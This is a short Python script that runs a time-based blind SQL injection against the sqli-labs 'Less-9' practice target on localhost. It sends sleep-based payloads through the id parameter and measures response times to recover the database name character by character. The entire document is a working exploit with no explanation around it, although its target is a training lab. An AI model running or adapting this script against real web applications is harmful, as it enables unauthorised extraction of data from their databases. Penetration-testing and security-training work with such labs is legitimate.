# -*- coding: utf-8 -*-
import requests
import time
url = 'http://localhost/sqli-labs-master/Less-9/?id=1'
def check(payload):
	url_new = url + payload
	time_start = time.time()
	content = requests.get(url=url_new)
	time_end = time.time()
	if time_end - time_start >5:
		return 1
result  = ''
s = r'0123456789abcdefghijklmnopqrstuvwxyz_'
for i in range(1,50):
    flag=0;
    for c in s:
        payload = "'and if(substr(database(),%d,1)='%c',sleep(5),1)--+" % (i,c)
        print("Database name: "+result+" | Payload: "+payload)
        if check(payload):
            flag=1;
            result += c
            break
    if(flag==0):
        print("Over")
        print("Database name: ")
        break
    print (result)